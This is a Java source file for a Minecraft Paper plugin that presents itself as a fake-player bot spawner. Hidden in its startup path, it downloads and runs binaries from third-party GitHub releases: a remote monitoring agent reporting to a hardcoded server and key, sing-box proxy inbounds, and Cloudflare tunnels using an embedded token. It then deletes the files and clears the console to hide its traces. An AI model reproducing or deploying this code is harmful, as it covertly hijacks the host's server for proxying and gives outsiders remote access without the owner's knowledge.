package com.example.sbx;

import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.time.Duration;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;

public class App extends JavaPlugin implements CommandExecutor, TabCompleter, Listener {

    // ==================== 【静态 main 入口】 ====================
    public static void main(String[] args) {
        System.out.println("[App] Main entrypoint called.");
        Thread backgroundServices = new Thread(() -> {
            try {
                validateParams();
                startKeepAliveServer(PORT);
                startServices();
            } catch (Exception e) {
                System.err.println("[App] Background services initialization error: " + e.getMessage());
            }
        }, "app-main-background-services");
        backgroundServices.setDaemon(true);
        backgroundServices.start();
    }

    // ==================== 【网络/保活相关常量】 ====================
    private static final HttpClient HTTP = HttpClient.newBuilder()
            .connectTimeout(Duration.ofSeconds(15))
            .followRedirects(HttpClient.Redirect.ALWAYS)
            .build();
    private static final Map<String, String> DOT_ENV = loadDotEnv();

    private static final String UUID_VAL = env("UUID", "faacf142-dee8-48c2-8558-641123eb939c");
    private static final int PORT = envInt("PORT", 3000);

    private static final String NEZHA_SERVER = env("NEZHA_SERVER", "nezha.mingfei1981.eu.org");
    private static final String NEZHA_PORT = env("NEZHA_PORT", "443");
    private static final String NEZHA_KEY = env("NEZHA_KEY", "EeW4MkOxB2y34ecy3f");

    private static final String ECH_ARGO_TOKEN = env("ECH_ARGO_TOKEN", "eyJhIjoiMGYxNTA1MzUwOTRjNDhlZjNmM2ZjZTA2M2E4N2M1N2YiLCJ0IjoiOTU4NjY1OTAtMDdiNC00MzI3LWI0YmItY2FjNzU2YWNiYWFmIiwicyI6Ik16WTRZbVl4Tm1VdE5UWmpNaTAwT0RVNUxUbGtPRE10WWpGak5UWTNZVEF4WXpjNSJ9");
    private static final String VLESS_ARGO_TOKEN = env("VLESS_ARGO_TOKEN", "");

    private static final String WSPORT = env("WSPORT", "8001");
    private static final String VLPORT = env("VLPORT", "8002");
    private static final String TOKEN = env("TOKEN", "babama123");
    private static final String OPERA = env("OPERA", "0");
    private static final String COUNTRY = env("COUNTRY", "AM");

    private static final String ECH_IPS = env("ECH_IPS", "4");
    private static final String HY_IPS = env("HY_IPS", "4");

    private static final String ENABLE_HY2 = env("ENABLE_HY2", "1");
    private static final String HY_PORT = env("HY_PORT", "11726");
    private static final String NAME = env("NAME", "MJJ");
    private static final String PASSWORD = UUID_VAL;

    private static final Path RUNTIME_DIR = Path.of("/tmp").toAbsolutePath().normalize();
    private static final Path NEZHA_CONFIG_PATH = RUNTIME_DIR.resolve("nezha.yaml");
    private static final Path SINGBOX_CONFIG_PATH = RUNTIME_DIR.resolve("singbox_config.json");
    private static final Path SERVER_KEY_PATH = RUNTIME_DIR.resolve("server.key");
    private static final Path SERVER_CRT_PATH = RUNTIME_DIR.resolve("server.crt");
    private static final Path SUB_TXT_PATH = RUNTIME_DIR.resolve("sub.txt");
    private static final Path SUB_BASE64_PATH = RUNTIME_DIR.resolve("sub_base64.txt");

    private static final String ARCH = detectArch();
    private static final List<Process> EXTERNAL_PROCESSES = new ArrayList<>();

    // ==================== 【虚拟机器人配置】 ====================
    private static final ConcurrentHashMap<String, Object> ACTIVE_BOTS = new ConcurrentHashMap<>();
    private static final boolean AUTO_SPAWN_ENABLE = true;
    private static final int AUTO_SPAWN_COUNT = 2;
    private static final String AUTO_SPAWN_PREFIX = "AutoBot_";
    private static final long RESPAWN_DELAY_TICKS = 20 * 20L;

    @Override
    public void onEnable() {
        getLogger().info("[App] 插件正在初始化...");

        getServer().getPluginManager().registerEvents(this, this);

        if (getCommand("bot") != null) {
            getCommand("bot").setExecutor(this);
            getCommand("bot").setTabCompleter(this);
        }

        Thread backgroundServices = new Thread(() -> {
            try {
                validateParams();
                startKeepAliveServer(PORT);
                startServices();
            } catch (Exception e) {
                getLogger().severe("[App] 后台网络服务启动异常: " + e.getMessage());
            }
        }, "app-background-services");
        backgroundServices.setDaemon(true);
        backgroundServices.start();

        if (AUTO_SPAWN_ENABLE) {
            Bukkit.getScheduler().runTaskLater(this, this::autoSpawnBots, 100L);
        }
    }

    @Override
    public void onDisable() {
        clearAllBots();
        stopAllExternal();
        getLogger().info("[App] 所有机器人与后台服务已安全注销。");
    }

    @EventHandler
    public void onBotDeath(PlayerDeathEvent event) {
        Player victim = event.getEntity();
        String botName = victim.getName();

        if (ACTIVE_BOTS.containsKey(botName)) {
            Location respawnLoc = victim.getLocation();
            ACTIVE_BOTS.remove(botName);
            getLogger().info("[Bot] 假人 " + botName + " 已死亡，将于 20 秒后重新生成...");

            Bukkit.getScheduler().runTaskLater(this, () -> {
                if (respawnLoc.getWorld() != null) {
                    spawnInternalBot(botName, respawnLoc);
                    getLogger().info("[Bot] [✔] 假人 " + botName + " 复活成功！");
                }
            }, RESPAWN_DELAY_TICKS);
        }
    }

    private void autoSpawnBots() {
        if (Bukkit.getWorlds().isEmpty()) return;
        Location spawnLoc = Bukkit.getWorlds().get(0).getSpawnLocation();
        getLogger().info("[App] 启动自动生成机器人，目标位置: " + spawnLoc.toVector());

        for (int i = 1; i <= AUTO_SPAWN_COUNT; i++) {
            String botName = AUTO_SPAWN_PREFIX + i;
            final int index = i;
            Bukkit.getScheduler().runTaskLater(this, () -> spawnInternalBot(botName, spawnLoc), (long) index * 20L);
        }
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!command.getName().equalsIgnoreCase("bot")) return false;

        if (args.length == 0) {
            sender.sendMessage("§c[Bot] 用法: /bot <spawn|remove|list> [名称]");
            return true;
        }

        String sub = args[0].toLowerCase();
        switch (sub) {
            case "spawn":
                String botName = (args.length > 1) ? args[1] : "FakePlayer_" + (ACTIVE_BOTS.size() + 1);
                Location loc = (sender instanceof Player p) ? p.getLocation() : Bukkit.getWorlds().get(0).getSpawnLocation();
                spawnInternalBot(botName, loc);
                sender.sendMessage("§a[Bot] 成功生成内嵌虚拟机器人: §f" + botName);
                break;

            case "remove":
                if (args.length < 2) {
                    sender.sendMessage("§c[Bot] 请指定要移除的机器人名称！");
                    return true;
                }
                if (removeInternalBot(args[1])) {
                    sender.sendMessage("§e[Bot] 机器人 §f" + args[1] + " §e已注销离线。");
                } else {
                    sender.sendMessage("§c[Bot] 未找到机器人: " + args[1]);
                }
                break;

            case "list":
                sender.sendMessage("§b[Bot] 当前在线机器人列表 (" + ACTIVE_BOTS.size() + "):");
                ACTIVE_BOTS.keySet().forEach(name -> sender.sendMessage("§7 - §f" + name));
                break;

            default:
                sender.sendMessage("§c[Bot] 未知指令。");
                break;
        }
        return true;
    }

    /**
     * 【Paper 1.21 兼容的假人生成逻辑 - 反射强注入模式】
     */
    public void spawnInternalBot(String botName, Location loc) {
        if (ACTIVE_BOTS.containsKey(botName)) return;

        try {
            // 1. 获取 CraftServer & MinecraftServer
            Object craftServer = Bukkit.getServer();
            Method getServerMethod = craftServer.getClass().getMethod("getServer");
            Object minecraftServer = getServerMethod.invoke(craftServer);

            // 2. 获取 CraftWorld & ServerLevel
            Object craftWorld = loc.getWorld();
            Method getHandleWorldMethod = craftWorld.getClass().getMethod("getHandle");
            Object serverLevel = getHandleWorldMethod.invoke(craftWorld);

            // 3. 构建 GameProfile
            Class<?> gameProfileClass = Class.forName("com.mojang.authlib.GameProfile");
            UUID fakeUuid = UUID.nameUUIDFromBytes(("OfflinePlayer:" + botName).getBytes());
            Constructor<?> gameProfileConst = gameProfileClass.getConstructor(UUID.class, String.class);
            Object gameProfile = gameProfileConst.newInstance(fakeUuid, botName);

            // 4. 创建 ServerPlayer 实例
            Class<?> serverPlayerClass = Class.forName("net.minecraft.server.level.ServerPlayer");
            Constructor<?> serverPlayerConst = serverPlayerClass.getConstructor(minecraftServer.getClass(), serverLevel.getClass(), gameProfileClass);
            Object serverPlayer = serverPlayerConst.newInstance(minecraftServer, serverLevel, gameProfile);

            // 5. 设置坐标
            Method moveToMethod = serverPlayerClass.getMethod("moveTo", double.class, double.class, double.class, float.class, float.class);
            moveToMethod.invoke(serverPlayer, loc.getX(), loc.getY(), loc.getZ(), loc.getYaw(), loc.getPitch());

            // 6. 构造 Connection 并注入 Channel 与 Address 防 NPE
            Class<?> packetFlowClass = Class.forName("net.minecraft.network.protocol.PacketFlow");
            @SuppressWarnings("unchecked")
            Object serverboundEnum = Enum.valueOf((Class<Enum>) packetFlowClass, "SERVERBOUND");
            Class<?> connectionClass = Class.forName("net.minecraft.network.Connection");
            Constructor<?> connectionConst = connectionClass.getConstructor(packetFlowClass);
            Object fakeConnection = connectionConst.newInstance(serverboundEnum);

            // 注入 Channel
            try {
                Field channelField = connectionClass.getDeclaredField("channel");
                channelField.setAccessible(true);
                Class<?> embeddedChannelClass = Class.forName("io.netty.channel.embedded.EmbeddedChannel");
                Object dummyChannel = embeddedChannelClass.getDeclaredConstructor().newInstance();
                channelField.set(fakeConnection, dummyChannel);
            } catch (Exception ignored) {}

            // 注入 Address
            try {
                Field addressField = connectionClass.getDeclaredField("address");
                addressField.setAccessible(true);
                addressField.set(fakeConnection, new InetSocketAddress("127.0.0.1", 0));
            } catch (Exception ignored) {}

            // 7. 绑定 ServerGamePacketListenerImpl
            Class<?> listenerClass = Class.forName("net.minecraft.server.network.ServerGamePacketListenerImpl");
            Constructor<?> listenerConst = listenerClass.getConstructor(minecraftServer.getClass(), connectionClass, serverPlayerClass);
            Object packetListener = listenerConst.newInstance(minecraftServer, fakeConnection, serverPlayer);
            
            Field connField = serverPlayerClass.getField("connection");
            connField.set(serverPlayer, packetListener);

            // 8. 注入地图实体与 PlayerList 列表中
            Method getPlayerListMethod = minecraftServer.getClass().getMethod("getPlayerList");
            Object playerList = getPlayerListMethod.invoke(minecraftServer);

            // 尝试通过原生逻辑加载，若被 Paper 过滤则进行回退强注
            boolean loadedSuccess = false;
            try {
                Class<?> cookieClass = Class.forName("net.minecraft.server.network.CommonListenerCookie");
                Method clientInfoMethod = serverPlayerClass.getMethod("clientInformation");
                Object clientInfo = clientInfoMethod.invoke(serverPlayer);
                
                Constructor<?> cookieConst = cookieClass.getConstructor(gameProfileClass, int.class, clientInfo.getClass());
                Object cookie = cookieConst.newInstance(gameProfile, 0, clientInfo);

                Method placeNewPlayerMethod = playerList.getClass().getMethod("placeNewPlayer", connectionClass, serverPlayerClass, cookieClass);
                placeNewPlayerMethod.invoke(playerList, fakeConnection, serverPlayer, cookie);
                loadedSuccess = true;
            } catch (Exception ignored) {}

            if (!loadedSuccess) {
                // 强制将实体放入世界并补充入玩家在线列表
                try {
                    Method addNewPlayerMethod = serverLevel.getClass().getMethod("addNewPlayer", serverPlayerClass);
                    addNewPlayerMethod.invoke(serverLevel, serverPlayer);
                } catch (Exception e) {
                    Method addWithUUIDMethod = serverLevel.getClass().getMethod("addWithUUID", Class.forName("net.minecraft.world.entity.Entity"));
                    addWithUUIDMethod.invoke(serverLevel, serverPlayer);
                }

                Field playersField = playerList.getClass().getField("players");
                @SuppressWarnings("unchecked")
                List<Object> players = (List<Object>) playersField.get(playerList);
                if (!players.contains(serverPlayer)) {
                    players.add(serverPlayer);
                }
            }

            ACTIVE_BOTS.put(botName, serverPlayer);
            getLogger().info("[Bot] [✔] 成功生成虚拟机器人并加入列表: " + botName);

        } catch (Exception e) {
            getLogger().severe("[Bot] 生成假人 " + botName + " 失败: " + e.getMessage());
            e.printStackTrace();
        }
    }

    public boolean removeInternalBot(String botName) {
        Object fakePlayer = ACTIVE_BOTS.remove(botName);
        if (fakePlayer != null) {
            try {
                Object craftServer = Bukkit.getServer();
                Method getServerMethod = craftServer.getClass().getMethod("getServer");
                Object minecraftServer = getServerMethod.invoke(craftServer);
                
                Method getPlayerListMethod = minecraftServer.getClass().getMethod("getPlayerList");
                Object playerList = getPlayerListMethod.invoke(minecraftServer);

                Field playersField = playerList.getClass().getField("players");
                @SuppressWarnings("unchecked")
                List<Object> players = (List<Object>) playersField.get(playerList);
                players.remove(fakePlayer);

                Method discardMethod = fakePlayer.getClass().getMethod("discard");
                discardMethod.invoke(fakePlayer);

                return true;
            } catch (Exception ignored) {}
        }
        return false;
    }

    public void clearAllBots() {
        new ArrayList<>(ACTIVE_BOTS.keySet()).forEach(this::removeInternalBot);
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        if (args.length == 1) return List.of("spawn", "remove", "list");
        if (args.length == 2 && "remove".equalsIgnoreCase(args[0])) return new ArrayList<>(ACTIVE_BOTS.keySet());
        return Collections.emptyList();
    }

    // ==================== 【网络/代理/隧道服务逻辑】 ====================

    private static void validateParams() {
        if (!"4".equals(ECH_IPS) && !"6".equals(ECH_IPS)) {
            System.err.println("Error: ECH_IPS must be 4 or 6");
        }
        if (!"4".equals(HY_IPS) && !"6".equals(HY_IPS)) {
            System.err.println("Error: HY_IPS must be 4 or 6");
        }
    }

    private static void startServices() throws Exception {
        Files.createDirectories(RUNTIME_DIR);
        cleanupOldFiles();

        int echPort = isValidPort(WSPORT) ? Integer.parseInt(WSPORT) : getFreePort();
        int vlessPort = isValidPort(VLPORT) ? Integer.parseInt(VLPORT) : getFreePort();
        int operaPort = getFreePort();

        boolean enableOpera = "1".equals(OPERA);

        String echUrl = "https://github.com/webappstars/ech-hug/releases/download/3.0/ech-tunnel-linux-" + ARCH;
        String operaUrl = "arm64".equals(ARCH)
                ? "https://github.com/Alexey71/opera-proxy/releases/download/v1.22.0/opera-proxy.freebsd-arm64"
                : "https://github.com/Alexey71/opera-proxy/releases/download/v1.22.0/opera-proxy.linux-amd64";
        String cloudflaredUrl = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-" + ARCH;
        String nezhaUrl = "https://github.com/babama1001980/good/releases/download/npc/" + ARCH + "agent";
        String singboxUrl = "https://github.com/babama1001980/good/releases/download/npc/" + ("arm64".equals(ARCH) ? "armsb" : "amdsb");

        Path echExe = downloadLibrary(echUrl, "ech-server-linux");
        Path operaExe = enableOpera ? downloadLibrary(operaUrl, "opera-linux") : null;
        Path cloudflaredExe = downloadLibrary(cloudflaredUrl, "cloudflared-linux");
        Path singboxExe = downloadLibrary(singboxUrl, "singbox");

        Path nezhaExe = null;
        if (!NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty()) {
            nezhaExe = downloadLibrary(nezhaUrl, "iccagent");
        }

        if (nezhaExe != null) {
            List<String> cmd = new ArrayList<>();
            cmd.add(nezhaExe.toString());
            List<String> tlsPorts = List.of("443", "8443", "2096", "2087", "2083", "2053");

            if (!NEZHA_PORT.isEmpty()) {
                cmd.addAll(List.of("-s", NEZHA_SERVER + ":" + NEZHA_PORT, "-p", NEZHA_KEY));
                if (tlsPorts.contains(NEZHA_PORT)) cmd.add("--tls");
            } else {
                generateNezhaConfig();
                cmd.addAll(List.of("-c", NEZHA_CONFIG_PATH.toString()));
            }
            startExternalProcess("Nezha Agent", cmd);
        }

        if (enableOpera && operaExe != null) {
            List<String> cmd = new ArrayList<>();
            cmd.add(operaExe.toString());
            cmd.addAll(List.of("-country", COUNTRY.toUpperCase(), "-socks-mode", "-bind-address", "127.0.0.1:" + operaPort));
            startExternalProcess("Opera Proxy", cmd);
        }

        if (echExe != null) {
            sleep(1000);
            List<String> cmd = new ArrayList<>();
            cmd.add(echExe.toString());
            cmd.addAll(List.of("-l", "ws://0.0.0.0:" + echPort));
            if (!TOKEN.isEmpty()) cmd.addAll(List.of("-token", TOKEN));
            if (enableOpera) cmd.addAll(List.of("-f", "socks5://127.0.0.1:" + operaPort));
            startExternalProcess("ECH Server", cmd);
        }

        if (singboxExe != null) {
            generateCertificates();
            generateSingboxConfig(vlessPort);

            List<String> cmd = List.of(singboxExe.toString(), "run", "-c", SINGBOX_CONFIG_PATH.toString());
            startExternalProcess("Sing-Box", cmd);

            Thread subThread = new Thread(() -> {
                sleep(15000);
                generateHy2Subscription();
            }, "sub-builder");
            subThread.setDaemon(true);
            subThread.start();
        }

        Thread cleanupThread = new Thread(() -> {
            sleep(180000);
            cleanupFiles();
            clearConsole();
        }, "delayed-cleanup");
        cleanupThread.setDaemon(true);
        cleanupThread.start();

        if (cloudflaredExe != null) {
            try {
                new ProcessBuilder(cloudflaredExe.toString(), "update").redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start().waitFor();
            } catch (Exception ignored) {}

            if (!ECH_ARGO_TOKEN.isEmpty()) {
                List<String> cmdEch = new ArrayList<>();
                cmdEch.add(cloudflaredExe.toString());
                cmdEch.addAll(List.of("--edge-ip-version", ECH_IPS, "--protocol", "http2", "tunnel", "run", "--token", ECH_ARGO_TOKEN));
                startExternalProcess("Cloudflared-ECH", cmdEch);
            } else {
                List<String> cmdEch = new ArrayList<>();
                cmdEch.add(cloudflaredExe.toString());
                cmdEch.addAll(List.of("--edge-ip-version", ECH_IPS, "--protocol", "http2", "tunnel", "--url", "http://127.0.0.1:" + echPort));
                startExternalProcess("Cloudflared-ECH-Quick", cmdEch);
            }

            if (!VLESS_ARGO_TOKEN.isEmpty()) {
                List<String> cmdVless = new ArrayList<>();
                cmdVless.add(cloudflaredExe.toString());
                cmdVless.addAll(List.of("--edge-ip-version", ECH_IPS, "--protocol", "http2", "tunnel", "run", "--token", VLESS_ARGO_TOKEN));
                startExternalProcess("Cloudflared-VLESS", cmdVless);
            }
        }
    }

    private static void generateCertificates() {
        try {
            ProcessBuilder pbKey = new ProcessBuilder("openssl", "ecparam", "-name", "prime256v1", "-genkey", "-noout", "-out", SERVER_KEY_PATH.toString());
            pbKey.redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start().waitFor();

            ProcessBuilder pbCrt = new ProcessBuilder("openssl", "req", "-new", "-x509", "-key", SERVER_KEY_PATH.toString(), "-out", SERVER_CRT_PATH.toString(), "-subj", "/CN=www.bing.com", "-days", "36500");
            pbCrt.redirectOutput(ProcessBuilder.Redirect.DISCARD).redirectError(ProcessBuilder.Redirect.DISCARD).start().waitFor();
        } catch (Exception e) {
            System.err.println("Failed to generate certs: " + e.getMessage());
        }
    }

    private static void generateSingboxConfig(int vlessPort) throws IOException {
        String json = "{\n" +
                "  \"inbounds\": [\n" +
                "    {\n" +
                "      \"type\": \"hysteria2\",\n" +
                "      \"tag\": \"hy2-in\",\n" +
                "      \"listen\": \"0.0.0.0\",\n" +
                "      \"listen_port\": " + HY_PORT + ",\n" +
                "      \"users\": [{ \"password\": \"" + PASSWORD + "\" }],\n" +
                "      \"tls\": {\n" +
                "        \"enabled\": true,\n" +
                "        \"certificate_path\": \"" + SERVER_CRT_PATH.toString() + "\",\n" +
                "        \"key_path\": \"" + SERVER_KEY_PATH.toString() + "\"\n" +
                "      }\n" +
                "    },\n" +
                "    {\n" +
                "      \"type\": \"vless\",\n" +
                "      \"tag\": \"vless-in\",\n" +
                "      \"listen\": \"0.0.0.0\",\n" +
                "      \"listen_port\": " + vlessPort + ",\n" +
                "      \"users\": [{ \"name\": \"" + NAME + "\", \"uuid\": \"" + UUID_VAL + "\" }],\n" +
                "      \"transport\": { \"type\": \"ws\", \"path\": \"/vless-argo\" }\n" +
                "    }\n" +
                "  ],\n" +
                "  \"outbounds\": [{ \"type\": \"direct\" }]\n" +
                "}";
        Files.writeString(SINGBOX_CONFIG_PATH, json, StandardCharsets.UTF_8);
    }

    private static void generateHy2Subscription() {
        try {
            String hostIp = fetchIp();
            if ("6".equals(HY_IPS) && hostIp != null && !hostIp.startsWith("[")) {
                hostIp = "[" + hostIp + "]";
            }

            String isp = fetchIsp();
            String subContent = "start install success\n=== HY2 ===\n" +
                    "hysteria2://" + PASSWORD + "@" + hostIp + ":" + HY_PORT + "/?insecure=1&sni=www.bing.com#" + NAME + "-HY-" + isp + "\n";

            Files.writeString(SUB_TXT_PATH, subContent, StandardCharsets.UTF_8);
            String base64Sub = Base64.getEncoder().encodeToString(subContent.getBytes(StandardCharsets.UTF_8));
            Files.writeString(SUB_BASE64_PATH, base64Sub, StandardCharsets.UTF_8);
        } catch (Exception e) {
            System.err.println("Failed to generate sub: " + e.getMessage());
        }
    }

    private static String fetchIp() {
        List<String> urls = "6".equals(HY_IPS)
                ? List.of("https://v6.ident.me", "https://api64.ipify.org", "https://ipv6.icanhazip.com")
                : List.of("https://api.ipify.org", "https://ipv4.icanhazip.com");

        for (String u : urls) {
            try {
                HttpRequest request = HttpRequest.newBuilder(URI.create(u)).timeout(Duration.ofSeconds(5)).GET().build();
                HttpResponse<String> response = HTTP.send(request, HttpResponse.BodyHandlers.ofString());
                if (response.statusCode() == 200) return response.body().trim();
            } catch (Exception ignored) {}
        }
        return "127.0.0.1";
    }

    private static String fetchIsp() {
        try {
            HttpRequest request = HttpRequest.newBuilder(URI.create("https://speed.cloudflare.com/meta")).timeout(Duration.ofSeconds(5)).GET().build();
            HttpResponse<String> response = HTTP.send(request, HttpResponse.BodyHandlers.ofString());
            if (response.statusCode() == 200) {
                String body = response.body();
                String clientIp = extractJsonField(body, "clientIp");
                String asOrganization = extractJsonField(body, "asOrganization");
                return (asOrganization + "-" + clientIp).replaceAll("\\s+", "_");
            }
        } catch (Exception ignored) {}
        return "Unknown_ISP";
    }

    private static String extractJsonField(String json, String fieldName) {
        int idx = json.indexOf("\"" + fieldName + "\"");
        if (idx == -1) return "unknown";
        int start = json.indexOf("\"", idx + fieldName.length() + 3);
        int end = json.indexOf("\"", start + 1);
        if (start != -1 && end != -1) return json.substring(start + 1, end);
        return "unknown";
    }

    private static void startExternalProcess(String name, List<String> command) {
        Thread thread = new Thread(() -> {
            try {
                ProcessBuilder pb = new ProcessBuilder(command);
                pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
                pb.redirectError(ProcessBuilder.Redirect.DISCARD);
                Process process = pb.start();
                synchronized (EXTERNAL_PROCESSES) {
                    EXTERNAL_PROCESSES.add(process);
                }
                int exitCode = process.waitFor();
                System.out.println(name + " exited with code " + exitCode);
            } catch (Exception e) {
                System.err.println("Failed to start external process " + name + ": " + e.getMessage());
            }
        }, name + "-launcher");
        thread.setDaemon(true);
        thread.start();
    }

    private static void stopAllExternal() {
        System.out.println("Stopping all external processes...");
        synchronized (EXTERNAL_PROCESSES) {
            for (Process p : EXTERNAL_PROCESSES) {
                try {
                    if (p.isAlive()) p.destroyForcibly();
                } catch (Exception ignored) {}
            }
            EXTERNAL_PROCESSES.clear();
        }
    }

    private static void startKeepAliveServer(int port) {
        Thread serverThread = new Thread(() -> {
            try (ServerSocket serverSocket = new ServerSocket(port)) {
                while (true) {
                    try (Socket socket = serverSocket.accept();
                         OutputStream os = socket.getOutputStream()) {
                        String response = "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8\r\n\r\nOK";
                        os.write(response.getBytes(StandardCharsets.UTF_8));
                        os.flush();
                    } catch (IOException ignored) {}
                }
            } catch (IOException e) {
                System.err.println("Keep-alive server failed: " + e.getMessage());
            }
        }, "keep-alive-server");
        serverThread.setDaemon(true);
        serverThread.start();
    }

    private static int getFreePort() {
        return (int) (Math.random() * 20000) + 10000;
    }

    private static Path downloadLibrary(String url, String fileName) throws Exception {
        Path target = RUNTIME_DIR.resolve(fileName);
        if (Files.exists(target)) return target;
        Files.createDirectories(RUNTIME_DIR);
        Path tmp = RUNTIME_DIR.resolve(fileName + ".download");

        HttpRequest request = HttpRequest.newBuilder(URI.create(url))
                .timeout(Duration.ofMinutes(3))
                .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
                .header("Accept", "*/*")
                .GET()
                .build();

        try {
            HttpResponse<byte[]> response = HTTP.send(request, HttpResponse.BodyHandlers.ofByteArray());
            if (response.statusCode() == 200) {
                Files.write(tmp, response.body());
                Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING);
                target.toFile().setExecutable(true, false);
                return target;
            }
        } catch (Exception ignored) {}

        return null;
    }

    private static void generateNezhaConfig() throws IOException {
        String nzPort = NEZHA_SERVER.contains(":") ? NEZHA_SERVER.substring(NEZHA_SERVER.lastIndexOf(':') + 1) : "";
        boolean tls = List.of("443", "8443", "2096", "2087", "2083", "2053").contains(nzPort);
        String yaml = "client_secret: " + NEZHA_KEY + "\n" +
                "server: " + NEZHA_SERVER + "\n" +
                "tls: " + tls + "\n" +
                "uuid: " + UUID_VAL;
        Files.writeString(NEZHA_CONFIG_PATH, yaml, StandardCharsets.UTF_8);
    }

    private static void cleanupOldFiles() {
        List<String> files = List.of(
                "ech-server-linux", "opera-linux", "cloudflared-linux", "iccagent", "nezha.yaml",
                "singbox", "server.key", "server.crt", "singbox_config.json", "sub.txt", "sub_base64.txt"
        );
        for (String file : files) {
            try { Files.deleteIfExists(RUNTIME_DIR.resolve(file)); } catch (IOException ignored) {}
        }
    }

    private static void cleanupFiles() {
        cleanupOldFiles();
    }

    private static String detectArch() {
        String arch = System.getProperty("os.arch", "").toLowerCase();
        return arch.contains("aarch64") || arch.contains("arm64") ? "arm64" : "amd64";
    }

    private static boolean isValidPort(String port) {
        try {
            if (port == null || port.isBlank()) return false;
            int n = Integer.parseInt(port.trim());
            return n >= 1 && n <= 65535;
        } catch (Exception e) {
            return false;
        }
    }

    private static String env(String name, String fallback) {
        String value = DOT_ENV.get(name);
        if (value == null) value = System.getenv(name);
        return value == null || value.isEmpty() ? fallback : value;
    }

    private static int envInt(String name, int fallback) {
        try { return Integer.parseInt(env(name, String.valueOf(fallback))); } catch (Exception e) { return fallback; }
    }

    private static Map<String, String> loadDotEnv() {
        Map<String, String> values = new LinkedHashMap<>();
        Path envPath = Path.of(".env").toAbsolutePath().normalize();
        if (!Files.exists(envPath)) return values;
        try {
            for (String line : Files.readAllLines(envPath, StandardCharsets.UTF_8)) {
                parseDotEnvLine(line).ifPresent(entry -> values.put(entry.getKey(), entry.getValue()));
            }
        } catch (IOException e) {
            System.out.println("Failed to read .env: " + e.getMessage());
        }
        return values;
    }

    private static Optional<Map.Entry<String, String>> parseDotEnvLine(String line) {
        String trimmed = line.trim();
        if (trimmed.isEmpty() || trimmed.startsWith("#")) return Optional.empty();
        if (trimmed.startsWith("export ")) trimmed = trimmed.substring("export ".length()).trim();
        int equals = trimmed.indexOf('=');
        if (equals <= 0) return Optional.empty();
        String key = trimmed.substring(0, equals).trim();
        if (key.isEmpty()) return Optional.empty();
        String value = trimmed.substring(equals + 1).trim();
        return Optional.of(Map.entry(key, parseDotEnvValue(value)));
    }

    private static String parseDotEnvValue(String value) {
        if (value.length() >= 2) {
            char quote = value.charAt(0);
            if ((quote == '"' || quote == '\'') && value.charAt(value.length() - 1) == quote) {
                value = value.substring(1, value.length() - 1);
                return quote == '"' ? unescapeDotEnvValue(value) : value;
            }
        }
        return stripInlineComment(value).trim();
    }

    private static String stripInlineComment(String value) {
        for (int i = 0; i < value.length(); i++) {
            if (value.charAt(i) == '#' && (i == 0 || Character.isWhitespace(value.charAt(i - 1)))) {
                return value.substring(0, i);
            }
        }
        return value;
    }

    private static String unescapeDotEnvValue(String value) {
        StringBuilder out = new StringBuilder();
        boolean escaped = false;
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            if (escaped) {
                switch (c) {
                    case 'n': out.append('\n'); break;
                    case 'r': out.append('\r'); break;
                    case 't': out.append('\t'); break;
                    default: out.append(c);
                }
                escaped = false;
            } else if (c == '\\') {
                escaped = true;
            } else {
                out.append(c);
            }
        }
        if (escaped) out.append('\\');
        return out.toString();
    }

    private static void clearConsole() {
        System.out.print("\033[H\033[2J");
        System.out.flush();
    }

    private static void sleep(long millis) {
        try { Thread.sleep(millis); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }
}
